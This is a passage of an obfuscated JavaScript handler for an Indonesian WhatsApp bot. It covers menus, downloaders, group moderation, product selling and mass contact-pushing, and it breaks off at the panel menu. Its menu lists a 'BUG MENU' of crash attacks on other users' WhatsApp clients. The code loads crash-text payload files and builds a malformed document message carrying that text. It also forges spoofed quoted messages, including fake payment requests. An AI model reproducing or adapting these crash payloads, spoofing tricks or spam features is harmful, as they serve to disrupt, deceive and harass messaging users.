/*this script is not for sale!!
© Erlangga developer 
*/
module.exports = async (_0x59b98d, _0x16d835, _0x54a3c4) => {
  try {
    const _0x45f77c = _0x16d835 && _0x16d835?.mtype ? _0x16d835?.mtype === "conversation" ? _0x16d835?.message?.conversation : _0x16d835?.mtype === "imageMessage" ? _0x16d835?.message?.imageMessage?.caption : _0x16d835?.mtype === "videoMessage" ? _0x16d835?.message?.videoMessage?.caption : _0x16d835?.mtype === "extendedTextMessage" ? _0x16d835?.message?.extendedTextMessage?.text : _0x16d835?.mtype === "buttonsResponseMessage" ? _0x16d835?.message.buttonsResponseMessage.selectedButtonId : _0x16d835?.mtype === "listResponseMessage" ? _0x16d835?.message?.listResponseMessage?.singleSelectReply?.selectedRowId : _0x16d835?.mtype === "interactiveResponseMessage" ? appenTextMessage(JSON.parse(_0x16d835?.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) : _0x16d835?.mtype === "templateButtonReplyMessage" ? appenTextMessage(_0x16d835?.msg.selectedId, chatUpdate) : _0x16d835?.mtype === "messageContextInfo" ? _0x16d835?.message.buttonsResponseMessage?.selectedButtonId || _0x16d835?.message.listResponseMessage?.singleSelectReply.selectedRowId || _0x16d835?.text : "" : "";
    const _0x4948fa = typeof _0x16d835.text == "string" ? _0x16d835.text : "";
    const _0x3b78fb = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(_0x45f77c) ? _0x45f77c.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : ".";
    const _0x5c840e = _0x45f77c.startsWith(_0x3b78fb);
    const _0x3e5c8f = _0x45f77c.replace(_0x3b78fb, "").trim().split(/ +/).shift().toLowerCase();
    const _0x58554c = _0x3b78fb + _0x3e5c8f;
    const _0x57e1e7 = _0x45f77c.trim().split(/ +/).slice(1);
    const _0x4efc3b = () => {
      const _0x5b9baf = [];
      for (let _0x1a8725 = 0; _0x1a8725 < 10; _0x1a8725++) {
        const _0xfdb415 = Math.floor(Math.random() * 10);
        _0x5b9baf.push(_0xfdb415);
      }
      return _0x5b9baf.join("");
    };
    const _0x91e99f = _0x4efc3b();
    const _0x1be181 = _0x16d835.quoted ? _0x16d835.quoted : _0x16d835;
    const _0x3177c1 = (_0x1be181.msg || _0x1be181).mimetype || "";
    const _0x250d32 = _0x1be181.msg || _0x1be181;
    const _0x43281f = q = _0x57e1e7.join(" ");
    const _0x1a329f = await _0x59b98d.decodeJid(_0x59b98d.user.id);
    const _0x1d834a = _0x16d835.sender == owner + "@s.whatsapp.net" ? true : _0x16d835.sender == _0x1a329f ? true : false;
    const _0x570995 = _0x16d835.chat.endsWith("@g.us");
    const _0xd77fdd = _0x16d835.sender.split("@")[0];
    const _0x5208e = _0x16d835.pushName || "" + _0xd77fdd;
    const _0x1dc8f5 = _0x1a329f.includes(_0xd77fdd);
    const _0x2ffff5 = _0x570995 ? await _0x59b98d.groupMetadata(_0x16d835.chat) : {};
    let _0x537970 = _0x570995 ? _0x2ffff5?.participants?.find(_0x89ee03 => _0x89ee03.id == _0x1a329f) : "";
    let _0x5ee83f = _0x570995 ? _0x2ffff5?.participants?.find(_0xc97a26 => _0xc97a26.id == _0x16d835.sender) : "";
    const _0x104099 = _0x537970?.admin !== null ? true : false;
    const _0x515108 = _0x5ee83f?.admin !== null ? true : false;
    const {
      version: _0x51cd67
    } = require("./package.json");
    const {
      runtime: _0x3b2d71,
      getRandom: _0x46df6f,
      getTime: _0x293d3f,
      tanggal: _0x5a009b,
      toRupiah: _0x47d0c7,
      telegraPh: _0x111118,
      pinterest: _0x1083df,
      ucapan: _0x5cf2df,
      generateProfilePicture: _0x171641,
      getBuffer: _0x51fae7,
      fetchJson: _0x1b3529
    } = require("./all/function.js");
    const {
      toAudio: _0x20044e,
      toPTT: _0x54d44e,
      toVideo: _0x180f22,
      ffmpeg: _0xbdba2c
    } = require("./all/converter.js");
    const _0xba61f4 = JSON.parse(fs.readFileSync("./all/database/antilink.json"));
    const _0x362037 = JSON.parse(fs.readFileSync("./all/database/antilink2.json"));
    const _0x1eb39b = JSON.parse(fs.readFileSync("./all/database/contacts.json"));
    const _0x5b14b9 = JSON.parse(fs.readFileSync("./all/database/reseller.json"));
    const {
      teksbug1: _0x56a361
    } = require("./all/database/virtex.js");
    const {
      teksbug2: _0x1d071f
    } = require("./all/database/delay.js");
    let _0x2aaf9c = _0x5b14b9.includes(_0x16d835.sender);
    if (_0x16d835.message && !_0x570995) {
      console.log("\n< ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ >\n");
      console.log(chalk.magenta("Group Chat:"));
      console.log(chalk.black(chalk.bgWhite("[ MESSAGE ]")), chalk.white(chalk.bgMagenta(new Date())), chalk.black(chalk.bgWhite(_0x4948fa || _0x16d835.mtype)) + "\n" + chalk.white("=> From"), chalk.magenta(_0x5208e), chalk.magenta(_0x16d835.sender) + "\n" + chalk.white("=> In"), chalk.magenta(_0x2ffff5, _0x16d835.chat));
    } else {
      console.log("\n< ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ >\n");
      console.log(chalk.magenta("Private Chat:"));
      console.log(chalk.black(chalk.bgWhite("[ MESSAGE ]")), chalk.white(chalk.bgMagenta(new Date())), chalk.black(chalk.bgWhite(_0x4948fa || _0x16d835.mtype)) + "\n" + chalk.white("=> From"), chalk.magenta(_0x5208e), chalk.magenta(_0x16d835.sender));
    }
    const _0x25bf75 = {
      key: {
        remoteJid: "status@broadcast",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        listResponseMessage: {
          title: "Hello My Friends"
        }
      }
    };
    const _0x3634cf = async _0x19f1a9 => {
      const _0x111b54 = {
        quoted: _0x25bf75
      };
      return _0x59b98d.sendMessage(_0x19f1a9, {
        document: fs.readFileSync("./package.json"),
        mimetype: "😄😇😂🔥",
        fileName: "Paket.zip",
        fileLength: 99999999999,
        caption: "key.com" + _0x1d071f
      }, _0x111b54);
    };
    let _0x260654;
    try {
      _0x260654 = await _0x59b98d.profilePictureUrl(_0x16d835.sender, "image");
    } catch (_0x1194c6) {
      _0x260654 = "https://telegra.ph/file/a059a6a734ed202c879d3.jpg";
    }
    async function _0x3abc22(_0x4141a9) {
      return _0x59b98d.sendMessage(_0x16d835.chat, {
        text: "" + _0x4141a9,
        contextInfo: {
          mentionedJid: [_0x16d835.sender],
          externalAdReply: {
            showAdAttribution: true,
            thumbnailUrl: _0x260654,
            title: "｢ ACCESS DENIED ｣",
            body: "© Powered By " + namabot,
            previewType: "PHOTO"
          }
        }
      }, {
        quoted: _0x16d835
      });
    }
    const _0x4f60e6 = {
      text: namabot
    };
    const _0x3e16b5 = {
      extendedTextMessage: _0x4f60e6
    };
    const _0x5762b2 = {
      currencyCodeIso4217: "USD",
      amount1000: 999999999,
      requestFrom: "0@s.whatsapp.net",
      noteMessage: _0x3e16b5,
      expiryTimestamp: 999999999,
      amount: {
        value: 91929291929,
        offset: 1000,
        currencyCode: "INR"
      }
    };
    const _0x3e3ef0 = {
      requestPaymentMessage: _0x5762b2
    };
    const _0x5d6b91 = {
      key: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: "ownername",
        participant: "0@s.whatsapp.net"
      },
      message: _0x3e3ef0
    };
    const _0xfff411 = _0x5d6b91;
    const _0x143656 = {
      key: {
        remoteJid: "status@broadcast",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: "120363224727390375@newsletter",
          newsletterName: "Hore",
          jpegThumbnail: "",
          caption: "Powered By " + namaowner,
          inviteExpiration: Date.now() + 1814400000
        }
      }
    };
    const _0x500d56 = {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      ...(_0x16d835.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x570451 = {
      productImage: {
        mimetype: "image/jpeg",
        jpegThumbnail: ""
      },
      title: "Pterodactyl Server By " + namaowner,
      description: null,
      currencyCode: "IDR",
      priceAmount1000: "9999999999",
      retailerId: "Powered By langgxyz",
      productImageCount: 1
    };
    const _0xef94e = {
      product: _0x570451,
      businessOwnerJid: "0@s.whatsapp.net"
    };
    const _0x1a6280 = {
      productMessage: _0xef94e
    };
    const _0x20a861 = {
      key: _0x500d56,
      message: _0x1a6280
    };
    const _0x1f415b = _0x20a861;
    const _0xb48a6e = {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      ...(_0x16d835.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x359d9f = {
      title: "Bot WhatsApp By Erlangga",
      description: _0x5208e + " order",
      currencyCode: "IDR",
      priceAmount1000: "1000000000000",
      retailerId: "𝐄𝐫𝐥𝐚𝐧𝐠𝐠𝐚 𝐃𝐞𝐯𝐯",
      productImageCount: 1
    };
    const _0x3021d9 = {
      product: _0x359d9f,
      businessOwnerJid: "0@s.whatsapp.net"
    };
    const _0x28c759 = {
      productMessage: _0x3021d9
    };
    const _0x23d23f = {
      key: _0xb48a6e,
      message: _0x28c759
    };
    const _0x2c6c12 = _0x23d23f;
    const _0x5e858e = {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      ...(_0x16d835.chat ? {
        remoteJid: "0@s.whatsapp.net"
      } : {})
    };
    const _0x288676 = {
      key: _0x5e858e,
      message: {
        extendedTextMessage: {
          text: "Thank you for using my services"
        }
      }
    };
    const _0xed6d2 = _0x288676;
    const _0x4b7ab7 = {
      participant: "0@s.whatsapp.net",
      ...(_0x16d835.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x2c7d68 = {
      title: "Powered By " + namaowner,
      jpegThumbnail: ""
    };
    const _0x4f943d = {
      documentMessage: _0x2c7d68
    };
    const _0x5bd4b6 = {
      key: _0x4b7ab7,
      message: _0x4f943d
    };
    const _0x1ce986 = _0x5bd4b6;
    const _0x3c2a14 = {
      participant: "0@s.whatsapp.net",
      ...(_0x16d835.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x58402b = {
      key: _0x3c2a14,
      message: {
        locationMessage: {
          name: "WhatsApp Bot JPM By Langgxyz",
          jpegThumbnail: ""
        }
      }
    };
    const _0x4369d5 = _0x58402b;
    const _0x327d4f = {
      participant: "0@s.whatsapp.net",
      ...(_0x16d835.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x49e807 = {
      key: _0x327d4f,
      message: {
        locationMessage: {
          name: "WhatsApp Bot Pushkontak By Erlangga",
          jpegThumbnail: ""
        }
      }
    };
    const _0x153ce1 = _0x49e807;
    const _0xac7742 = {
      participant: "0@s.whatsapp.net",
      ...(_0x1a329f ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x5b3269 = {
      displayName: "" + namaowner,
      vcard: "BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285808448146:+62 858-0844-8146\nitem1.X-ABLabel:Ponsel\nEND:VCARD",
      sendEphemeral: true
    };
    const _0x2fdd49 = {
      contactMessage: _0x5b3269
    };
    const _0x171c95 = {
      key: _0xac7742,
      message: _0x2fdd49
    };
    const _0x5e2c0c = _0x171c95;
    if (global.owneroff && !_0x5c840e) {
      if (!_0x570995 && !_0x1d834a) {
        let _0x1d78f3 = "*Hai Kak* @" + _0x16d835.sender.split("@")[0] + "\n\nMaaf *Ownerku Sedang Offline*, Silahkan Tunggu Owner Kembali Online & Jangan Spam Chat";
        return _0x59b98d.sendMessage(_0x16d835.chat, {
          text: "" + _0x1d78f3,
          contextInfo: {
            mentionedJid: [_0x16d835.sender],
            externalAdReply: {
              showAdAttribution: true,
              thumbnail: fs.readFileSync("./media/mode.jpg"),
              renderLargerThumbnail: false,
              title: "｢ OWNER OFFLINE MODE ｣",
              mediaUrl: linkgc,
              sourceUrl: linkyt,
              previewType: "PHOTO"
            }
          }
        }, {
          quoted: null
        });
      }
    }
    if (_0xba61f4.includes(_0x16d835.chat)) {
      if (!_0x104099) {
        return;
      }
      if (!_0x515108 && !_0x1d834a && !_0x16d835.fromMe) {
        var _0x3117c9 = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi;
        if (_0x3117c9.test(_0x16d835.text)) {
          var _0x230812 = "https://chat.whatsapp.com/" + (await _0x59b98d.groupInviteCode(_0x16d835.chat));
          var _0x8de3f3 = new RegExp(_0x230812, "i");
          var _0x51bb93 = _0x8de3f3.test(_0x16d835.text);
          if (_0x51bb93) {
            return;
          }
          let _0x543529 = _0x16d835.key.participant;
          let _0x303e9e = _0x16d835.key.id;
          await _0x59b98d.sendMessage(_0x16d835.chat, {
            text: "@" + _0x16d835.sender.split("@")[0] + " Maaf Kamu Akan Saya Keluarkan Dari Grup Ini Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!",
            contextInfo: {
              mentionedJid: [_0x16d835.sender],
              externalAdReply: {
                thumbnail: fs.readFileSync("./media/warning.jpg"),
                title: "｢ LINK GRUP DETECTED ｣",
                previewType: "PHOTO"
              }
            }
          }, {
            quoted: _0x16d835
          });
          await _0x59b98d.sendMessage(_0x16d835.chat, {
            delete: {
              remoteJid: _0x16d835.chat,
              fromMe: false,
              id: _0x303e9e,
              participant: _0x543529
            }
          });
          await _0x59b98d.groupParticipantsUpdate(_0x16d835.chat, [_0x16d835.sender], "remove");
        }
      }
    }
    if (_0x362037.includes(_0x16d835.chat)) {
      if (!_0x104099) {
        return;
      }
      if (!_0x515108 && !_0x1d834a && !_0x16d835.fromMe) {
        var _0x3117c9 = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi;
        if (_0x3117c9.test(_0x16d835.text)) {
          var _0x230812 = "https://chat.whatsapp.com/" + (await _0x59b98d.groupInviteCode(_0x16d835.chat));
          var _0x8de3f3 = new RegExp(_0x230812, "i");
          var _0x51bb93 = _0x8de3f3.test(_0x16d835.text);
          if (_0x51bb93) {
            return;
          }
          let _0x43e8e8 = _0x16d835.key.participant;
          let _0x473697 = _0x16d835.key.id;
          await _0x59b98d.sendMessage(_0x16d835.chat, {
            text: "@" + _0x16d835.sender.split("@")[0] + " Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!",
            contextInfo: {
              mentionedJid: [_0x16d835.sender],
              externalAdReply: {
                thumbnail: fs.readFileSync("./media/warning.jpg"),
                title: "｢ LINK GRUP DETECTED ｣",
                previewType: "PHOTO"
              }
            }
          }, {
            quoted: _0x16d835
          });
          await _0x59b98d.sendMessage(_0x16d835.chat, {
            delete: {
              remoteJid: _0x16d835.chat,
              fromMe: false,
              id: _0x473697,
              participant: _0x43e8e8
            }
          });
        }
      }
    }
    let _0x286488 = _0x31dfef => {
      return "\n*Contoh Penggunaan :*\nketik *" + _0x58554c + "* " + _0x31dfef + "\n";
    };
    var _0x3fd3fb = async (_0x3a3f63, _0x5db801, _0x13f235) => {
      let _0x457de3 = await Jimp.read(_0x3a3f63);
      let _0x16f412 = await _0x457de3.resize(_0x5db801, _0x13f235).getBufferAsync(Jimp.MIME_JPEG);
      return _0x16f412;
    };
    function _0x2931f6(_0x2f46e1) {
      return _0x2f46e1.charAt(0).toUpperCase() + _0x2f46e1.slice(1);
    }
    const _0x5e8153 = _0x255e23 => {
      return crypto.randomBytes(_0x255e23).toString("hex").slice(0, _0x255e23);
    };
    switch (_0x3e5c8f) {
      case "menu":
        {
          let _0x16173c = "\n*Haii* @" + _0x16d835.sender.split("@")[0] + "\nSelamat " + _0x5cf2df() + "\n\n `Informasi Bot`\n- *Nama : " + _0x5208e + "*\n- *NamaBot : Asisten Bot Erlangga V3*\n- *NamaOwn : Erlanggasigma*\n- *Mode : " + (_0x59b98d.public ? "Public" : "Self") + "*\n- *Runtime : " + _0x3b2d71(process.uptime()) + "*\n\n`M A I N M E N U`\n* play\n* tourl\n* yts\n* tohd\n* chatgpt\n* ai\n* remini\n* sticker\n* pinterest\n* qc\n  \n`L I S T P R O D U C T`\n* panel\n* vps\n* domain\n* scriptbot\n  \n`D O W N L O A D E R`\n* tiktok\n* tiktokmp3\n* tiktokaudio\n* tiktokslide\n* instagram\n* facebook\n* ytmp3\n* mediafire\n  \n`C O N V E R T E R`\n* toaudio\n* tomp3\n* tovn\n* toptv\n* tts\n* toimage\n  \n`P A N E L M E N U`\n* addseller\n* delseller\n* listseller\n* addadmin\n* addadmin2\n* cpanel\n* cpanel2\n* cpanel3\n* listpanel\n* listadmin\n* deladmin\n* delpanel\n  \n`D O M A I N M E N U`\n* listdomain\n* listsubdomain\n* delsubdomain\n  \n`P U S H M E N U`\n* pushkontak\n* pushkontak1\n* pushkontak2\n* savekontak\n* savekontak2\n* listgc\n* idgc\n* jpm\n* jpm2\n* jpmpromosi\n* jpmtesti\n* jpmhidetag\n* startjpm\n* setteksjpm\n* teksjpm\n\n`G R O U P M E N U`\n* addmember\n* antilink\n* antilinkV2\n* hidetag\n* tagall\n* delete\n* open/close\n* setnamagc\n* setdeskgc\n* setppgc\n* kick\n* promote\n* leavegc\n* leavegc2\n* demote\n  \n`O W N E R M E N U`\n* clearsession\n* modeoff\n* modeon\n* done\n* anticall\n* autoread\n* welcome\n* setthumbnail\n* setppbotpanjang\n* setppbot\n* setnamabot\n* setbiobot\n* jpmslide\n\n`B U G M E N U`\n* overcursor - crash msg\n* curse - invisible home\n* ui - attack ui\n* overbusines - business crash\n* overbeta - beta crash\n";
          const _0x18cfce = {
            businessOwnerJid: _0x1a329f
          };
          _0x59b98d.sendMessage(_0x16d835.chat, {
            video: {
              url: "https://files.catbox.moe/fek13o.mp4"
            },
            document: fs.readFileSync("./lib/system/vocado.html"),
            gifPlayback: true,
            fileName: _0x5cf2df,
            fileLength: 13,
            pageCount: "520",
            mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            caption: _0x16173c,
            contextInfo: {
              externalAdReply: {
                containsAutoReply: true,
                mediaType: 1,
                mediaUrl: "",
                renderLargerThumbnail: true,
                showAdAttribution: false,
                sourceUrl: "https://whatsapp.com/channel/0029Vb3LbOyDZ4LVYsjO0Z0T",
                thumbnailUrl: "https://files.catbox.moe/8djp6x.jpg",
                title: "Asisten Bot Erlangga V3",
                body: "made by Erlangga"
              },
              forwardingScore: 10,
              isForwarded: true,
              mentionedJid: [_0x16d835?.sender],
              businessMessageForwardInfo: _0x18cfce,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363370508049655@newsletter",
                serverMessageId: null,
                newsletterName: "Channel Developer"
              }
            }
          }, {
            quoted: {
              key: {
                participant: "0@s.whatsapp.net",
                remoteJid: "0@s.whatsapp.net"
              },
              message: {
                conversation: "Asisten Bot Erlangga V3"
              }
            }
          });
          const _0x52e6d9 = {
            quoted: _0x2c6c12
          };
          await _0x59b98d.sendMessage(_0x16d835.chat, {
            audio: fs.readFileSync("./vn/sound.mp3"),
            mimetype: "audio/mpeg",
            ptt: true
          }, _0x52e6d9);
        }
        break;
      case "mainmenu":
        {
          let _0x2860aa = "\n*Haii* @" + _0x16d835.sender.split("@")[0] + "\nSelamat " + _0x5cf2df() + "\n\n*乂 B U G M E N U*\n* overcursor - crash msg\n* curse - invisible home\n* ui - attack ui\n* overbusines - business crash\n* overbete - beta crash\n";
          const _0x1882f1 = {
            businessOwnerJid: _0x1a329f
          };
          _0x59b98d.sendMessage(_0x16d835.chat, {
            video: {
              url: "https://files.catbox.moe/fek13o.mp4"
            },
            document: fs.readFileSync("./lib/system/vocado.html"),
            gifPlayback: true,
            fileName: _0x5cf2df,
            fileLength: 13,
            pageCount: "520",
            mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            caption: _0x2860aa,
            contextInfo: {
              externalAdReply: {
                containsAutoReply: true,
                mediaType: 1,
                mediaUrl: "",
                renderLargerThumbnail: true,
                showAdAttribution: false,
                sourceUrl: "https://whatsapp.com/channel/0029Vb3LbOyDZ4LVYsjO0Z0T",
                thumbnailUrl: "https://files.catbox.moe/8djp6x.jpg",
                title: "Asisten Bot Erlangga V3",
                body: "made by Erlangga"
              },
              forwardingScore: 10,
              isForwarded: true,
              mentionedJid: [_0x16d835?.sender],
              businessMessageForwardInfo: _0x1882f1,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363370508049655@newsletter",
                serverMessageId: null,
                newsletterName: "Channel Developer"
              }
            }
          }, {
            quoted: {
              key: {
                participant: "0@s.whatsapp.net",
                remoteJid: "0@s.whatsapp.net"
              },
              message: {
                conversation: "Asisten Bot Erlangga V3"
              }
            }
          });
          const _0x57d697 = {
            quoted: _0x2c6c12
          };
          await _0x59b98d.sendMessage(_0x16d835.chat, {
            audio: fs.readFileSync("./vn/sound.mp3"),
            mimetype: "audio/mpeg",
            ptt: true
          }, _0x57d697);
        }
        break;
      case "mainmenu":
        {
          let _0x15b496 = "\n*Haii* @" + _0x16d835.sender.split("@")[0] + "\nSelamat " + _0x5cf2df() + "\n\n*乂 M A I N M E N U*\n* play\n* tourl\n* yts\n* tohd\n* chatgpt\n* ai\n* remini\n* sticker\n* pinterest\n* qc\n";
          const _0x5818b0 = {
            businessOwnerJid: _0x1a329f
          };
          _0x59b98d.sendMessage(_0x16d835.chat, {
            video: {
              url: "https://files.catbox.moe/fek13o.mp4"
            },
            document: fs.readFileSync("./lib/system/vocado.html"),
            gifPlayback: true,
            fileName: _0x5cf2df,
            fileLength: 13,
            pageCount: "520",
            mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            caption: _0x15b496,
            contextInfo: {
              externalAdReply: {
                containsAutoReply: true,
                mediaType: 1,
                mediaUrl: "",
                renderLargerThumbnail: true,
                showAdAttribution: false,
                sourceUrl: "https://whatsapp.com/channel/0029Vb3LbOyDZ4LVYsjO0Z0T",
                thumbnailUrl: "https://files.catbox.moe/8djp6x.jpg",
                title: "Asisten Bot Erlangga V3",
                body: "made by Erlangga"
              },
              forwardingScore: 10,
              isForwarded: true,
              mentionedJid: [_0x16d835?.sender],
              businessMessageForwardInfo: _0x5818b0,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363370508049655@newsletter",
                serverMessageId: null,
                newsletterName: "Channel Developer"
              }
            }
          }, {
            quoted: {
              key: {
                participant: "0@s.whatsapp.net",
                remoteJid: "0@s.whatsapp.net"
              },
              message: {
                conversation: "Asisten Bot Erlangga V3"
              }
            }
          });
          const _0x404aec = {
            quoted: _0x2c6c12
          };
          await _0x59b98d.sendMessage(_0x16d835.chat, {
            audio: fs.readFileSync("./vn/sound.mp3"),
            mimetype: "audio/mpeg",
            ptt: true
          }, _0x404aec);
        }
        break;
      case "downloadmenu":
        {
          let _0x4957db = "\n*Haii* @" + _0x16d835.sender.split("@")[0] + "\nSelamat " + _0x5cf2df() + "\n\n*乂 D O W N L O A D E R*\n* tiktok\n* tiktokmp3\n* tiktokaudio\n* tiktokslide\n* instagram\n* facebook\n* ytmp3\n* mediafire\n";
          const _0x28b0a1 = {
            businessOwnerJid: _0x1a329f
          };
          _0x59b98d.sendMessage(_0x16d835.chat, {
            video: {
              url: "https://files.catbox.moe/fek13o.mp4"
            },
            document: fs.readFileSync("./lib/system/vocado.html"),
            gifPlayback: true,
            fileName: _0x5cf2df,
            fileLength: 13,
            pageCount: "520",
            mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            caption: _0x4957db,
            contextInfo: {
              externalAdReply: {
                containsAutoReply: true,
                mediaType: 1,
                mediaUrl: "",
                renderLargerThumbnail: true,
                showAdAttribution: false,
                sourceUrl: "https://whatsapp.com/channel/0029Vb3LbOyDZ4LVYsjO0Z0T",
                thumbnailUrl: "https://files.catbox.moe/8djp6x.jpg",
                title: "Asisten Bot Erlangga V3",
                body: "made by Erlangga"
              },
              forwardingScore: 10,
              isForwarded: true,
              mentionedJid: [_0x16d835?.sender],
              businessMessageForwardInfo: _0x28b0a1,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363370508049655@newsletter",
                serverMessageId: null,
                newsletterName: "Channel Developer"
              }
            }
          }, {
            quoted: {
              key: {
                participant: "0@s.whatsapp.net",
                remoteJid: "0@s.whatsapp.net"
              },
              message: {
                conversation: "Asisten Bot Erlangga V3"
              }
            }
          });
          const _0x536a2e = {
            quoted: _0x2c6c12
          };
          await _0x59b98d.sendMessage(_0x16d835.chat, {
            audio: fs.readFileSync("./vn/sound.mp3"),
            mimetype: "audio/mpeg",
            ptt: true
          }, _0x536a2e);
        }
        break;
      case "produkmenu":
        {
          let _0x3c6239 = "\nSilahkan Pilih List Harga Produk";
          const _0x7254b7 = {
            text: _0x3c6239
          };
          const _0x542c30 = {
            text: global.foother
          };
          const _0x2cd224 = {
            name: "single_select",
            buttonParamsJson: "{ \"title\": \"List Harga Produk\", \"sections\": [{ \"title\": \"# Silahkan Pilih Salah Satu Di Bawah Ini\", \"highlight_label\": \"Powered By " + namaowner + "\", \"rows\": [{ \"header\": \"Panel Pterodactyl\", \"title\": \"List Harga Panel\", \"id\": \".list_panel\" }, \n{ \"header\": \"VPS\", \"title\": \"List Harga Vps\", \"id\": \".list_vps\" }, \n{ \"header\": \"Domain\", \"title\": \"List Harga Domain\", \"id\": \".list_domain\" }, \n{ \"header\": \"Script Bot\", \"title\": \"List Harga Script Bot\", \"id\": \".list_scbot\" }]}]}"
          };
          const _0x5f29bf = {
            buttons: [_0x2cd224]
          };
          let _0x5c1d0b = generateWAMessageFromContent(_0x16d835.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x16d835.sender],
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create(_0x7254b7),
                  footer: proto.Message.InteractiveMessage.Footer.create(_0x542c30),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create(_0x5f29bf)
                })
              }
            }
          }, {
            userJid: _0x16d835.sender,
            quoted: _0x143656
          });
          await _0x59b98d.relayMessage(_0x5c1d0b.key.remoteJid, _0x5c1d0b.message, {
            messageId: _0x5c1d0b.key.id
          });
        }
        break;
      case "pushkontakmenu":
        {
          let _0x1c4ca9 = "\n*Haii* @" + _0x16d835.sender.split("@")[0] + "\nSelamat " + _0x5cf2df() + "\n\n*乂 P U S H M E N U*\n* pushkontak\n* pushkontak1\n* pushkontak2\n* savekontak\n* savekontak2\n* listgc\n* idgc\n* jpm\n* jpm2\n* jpmpromosi\n* jpmtesti\n* jpmhidetag\n* startjpm\n* setteksjpm\n* teksjpm\n";
          const _0x2245af = {
            text: _0x1c4ca9
          };
          let _0x4086ba = generateWAMessageFromContent(_0x16d835.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x16d835.sender],
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create(_0x2245af),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      name: "quick_reply",
                      buttonParamsJson: "{\"display_text\":\"Start Promosi\",\"title\":\"Start Promosi\",\"id\":\".startjpm\"}"
                    }]
                  })
                })
              }
            }
          }, {
            userJid: _0x16d835.sender,
            quoted: _0x143656
          });
          await _0x59b98d.relayMessage(_0x4086ba.key.remoteJid, _0x4086ba.message, {
            messageId: _0x4086ba.key.id
          });
        }
        break;
      case "convertmenu":
        {
          let _0x294b6d = "\n*Haii* @" + _0x16d835.sender.split("@")[0] + "\nSelamat " + _0x5cf2df() + "\n\n*乂 C O N V E R T E R*\n* toaudio\n* tomp3\n* tovn\n* toptv\n* tts\n* toimage\n";
          const _0x3336f1 = {
            businessOwnerJid: _0x1a329f
          };
          _0x59b98d.sendMessage(_0x16d835.chat, {
            video: {
              url: "https://files.catbox.moe/fek13o.mp4"
            },
            document: fs.readFileSync("./lib/system/vocado.html"),
            gifPlayback: true,
            fileName: _0x5cf2df,
            fileLength: 13,
            pageCount: "520",
            mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            caption: _0x294b6d,
            contextInfo: {
              externalAdReply: {
                containsAutoReply: true,
                mediaType: 1,
                mediaUrl: "",
                renderLargerThumbnail: true,
                showAdAttribution: false,
                sourceUrl: "https://whatsapp.com/channel/0029Vb3LbOyDZ4LVYsjO0Z0T",
                thumbnailUrl: "https://files.catbox.moe/8djp6x.jpg",
                title: "Asisten Bot Erlangga V3",
                body: "made by Erlangga"
              },
              forwardingScore: 10,
              isForwarded: true,
              mentionedJid: [_0x16d835?.sender],
              businessMessageForwardInfo: _0x3336f1,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363370508049655@newsletter",
                serverMessageId: null,
                newsletterName: "Channel Developer"
              }
            }
          }, {
            quoted: {
              key: {
                participant: "0@s.whatsapp.net",
                remoteJid: "0@s.whatsapp.net"
              },
              message: {
                conversation: "Asisten Bot Erlangga V3"
              }
            }
          });
          const _0x229622 = {
            quoted: _0x2c6c12
          };
          await _0x59b98d.sendMessage(_0x16d835.chat, {
            audio: fs.readFileSync("./vn/sound.mp3"),
            mimetype: "audio/mpeg",
            ptt: true
          }, _0x229622);
        }
        break;
      case "panelmenu":
        {
